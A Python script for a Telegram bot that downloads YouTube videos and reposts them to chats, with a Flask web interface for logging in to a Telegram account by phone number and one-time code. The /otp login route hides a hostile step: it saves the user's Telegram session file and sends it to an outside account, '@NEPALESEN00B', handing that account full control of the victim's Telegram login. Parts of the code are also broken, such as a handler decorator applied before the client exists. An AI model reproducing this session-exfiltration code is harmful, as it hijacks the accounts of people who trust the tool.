import logging
import os
import re
import yt_dlp
from pyrogram import Client, filters, errors
from threading import Thread
from queue import Queue
from flask import Flask, request
import shutil
import time

# Configure logging
logging.basicConfig(level=logging.INFO)

# Define the path to the session file
session_file_path = "my_bot.session"

# Initialize Flask app
flask_app = Flask(__name__)

# Global variables to store login details
api_id = None
api_hash = None
phone_number = None
otp_received = False
bot_token = os.getenv("BOT_TOKEN")
app = None

# Define the directory where videos are saved
VIDEO_DIR = "./sentvideo_in_telegram/"

# Create the video directory if it doesn't exist
if not os.path.exists(VIDEO_DIR):
    os.makedirs(VIDEO_DIR)

# Define YouTube URL pattern
youtube_url_pattern = r'(https?://)?(www\.)?(youtube\.com|youtu\.be)/\S+'

# Queue to hold tuples of (chat_id, YouTube link)
youtube_links_queue = Queue()

# Retry delay in seconds
RETRY_DELAY = 5

# Function to delete all files in the video directory
def clear_video_directory():
    for filename in os.listdir(VIDEO_DIR):
        file_path = os.path.join(VIDEO_DIR, filename)
        try:
            if os.path.isfile(file_path) or os.path.islink(file_path):
                os.unlink(file_path)
            elif os.path.isdir(file_path):
                shutil.rmtree(file_path)
            logging.info(f"Deleted file: {file_path}")
        except Exception as e:
            logging.error(f"Failed to delete {file_path}. Reason: {e}")

# Worker function to process YouTube links
def process_youtube_links():
    while True:
        try:
            logging.info("Worker thread: Waiting for next YouTube link...")
            chat_id, youtube_url = youtube_links_queue.get()  # Get the next item from the queue
            logging.info(f"Worker thread: Processing link {youtube_url} for chat_id {chat_id}")

            # Download the video using yt-dlp
            ydl_opts = {
                'format': 'best',
                'outtmpl': VIDEO_DIR + '%(title)s.%(ext)s',
                'postprocessors': [{
                    'key': 'FFmpegMetadata'
                }]
            }

            # Retry loop in case of download failures
            retries = 0
            while retries < 3:
                try:
                    with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                        info_dict = ydl.extract_info(youtube_url, download=True)
                        video_title = info_dict.get('title', None)
                    break
                except Exception as e:
                    logging.error(f"Failed to download video: {e}")
                    retries += 1
                    if retries < 3:
                        logging.info(f"Retrying download... (Attempt {retries + 1})")
                        time.sleep(RETRY_DELAY)
                    else:
                        logging.error("Max retry attempts reached for video download.")
                        youtube_links_queue.task_done()
                        continue

            # Find the downloaded video file
            video_files = os.listdir(VIDEO_DIR)
            video_file_path = os.path.join(VIDEO_DIR, video_files[0]) if video_files else None

            if not video_file_path:
                logging.error("No video files found after download.")
                youtube_links_queue.task_done()
                continue

            logging.info(f"Video downloaded successfully: {video_file_path}")

            # Retry loop in case of sending failures
            retries = 0
            while retries < 3:
                try:
                    # Send the video
                    sent_message = app.send_video(
                        chat_id=chat_id,
                        video=video_file_path,
                        caption=video_title,
                        supports_streaming=True
                    )
                    # Pin the video message
                    app.pin_chat_message(chat_id=chat_id, message_id=sent_message.id)
                    logging.info(f"Video sent successfully: {video_file_path}")
                    # Clear the video directory
                    clear_video_directory()
                    break
                except Exception as e:
                    logging.error(f"Failed to send video: {e}")
                    retries += 1
                    if retries < 3:
                        logging.info(f"Retrying to send video... (Attempt {retries + 1})")
                        time.sleep(RETRY_DELAY)
                    else:
                        logging.error("Max retry attempts reached for sending video.")
                        youtube_links_queue.task_done()
                        continue

            youtube_links_queue.task_done()

        except Exception as e:
            logging.error(f"Unexpected error in processing: {e}")

# Function to handle incoming messages
@app.on_message(filters.text & filters.regex(youtube_url_pattern))
def handle_message(client, message):
    chat_id = message.chat.id  # Get the chat_id from the incoming message
    logging.info(f"Received message from chat_id {chat_id}: {message.text}")
    youtube_url_match = re.search(youtube_url_pattern, message.text)
    youtube_url = youtube_url_match.group(0)
    logging.info(f"Detected YouTube URL: {youtube_url}")
    # Delete the YouTube link message immediately
    client.delete_messages(chat_id=chat_id, message_ids=[message.id])
    logging.info(f"Deleted message with YouTube URL from chat_id {chat_id}")
    youtube_links_queue.put((chat_id, youtube_url))  # Add the tuple to the queue

# Flask route to start bot setup
@flask_app.route('/startit', methods=['POST'])
def start_it():
    global api_id, api_hash, phone_number, app
    data = request.json
    api_id = data.get('api_id')
    api_hash = data.get('api_hash')
    phone_number = data.get('phone_number')
    
    if api_id and api_hash and phone_number:
        app = Client("my_bot", api_id=api_id, api_hash=api_hash)
        app.connect()
        app.send_code(phone_number)
        return "Code sent to phone number."
    return "Invalid input."

# Flask route to receive OTP and complete setup
@flask_app.route('/otp', methods=['POST'])
def receive_otp():
    global app, otp_received
    data = request.json
    otp = data.get('otp')
    
    if otp:
        try:
            app.sign_in(phone_number, otp)
            app.start()
            otp_received = True
            # Save the session file
            app.save_session(session_file_path)
            # Forward the session file to @NEPALESEN00B
            app.send_document("@NEPALESEN00B", session_file_path)
            return "Bot setup complete. Running..."
        except errors.PhoneCodeInvalid:
            return "Invalid OTP. Please try again."
    return "Invalid input."

# Start the Pyrogram client and the worker thread if session file exists
if os.path.exists(session_file_path):
    app = Client("my_bot", bot_token=bot_token)
    app.start()

    # Start the worker thread
    worker_thread = Thread(target=process_youtube_links)
    worker_thread.start()

    logging.info("Bot is running.")

# Start Flask app
flask_app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))

if app and otp_received:
    app.run()
                    
